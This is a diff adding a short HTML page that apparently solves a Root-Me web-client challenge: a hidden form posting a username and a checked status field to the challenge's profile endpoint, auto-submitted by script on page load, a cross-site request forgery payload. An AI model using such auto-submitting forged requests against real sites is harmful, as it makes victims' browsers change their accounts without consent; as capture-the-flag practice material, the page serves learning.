@@ -1,0 +1,16 @@
+<form action="http://challenge01.root-me.org/web-client/ch22/index.php?action=profile" method="post" enctype="multipart/form-data">
+    <div class="form-group">
+    <label>Username:</label>
+    <input type="text" name="username" value="test">
+    </div>
+    <br>		
+    <div class="form-group">
+    <label>Status:</label>
+    <input type="checkbox" name="status" checked>
+    </div>
+    <br>	
+    <button type="submit">Submit</button>
+</form>
+<script>
+    document.forms[0].submit();
+</script>
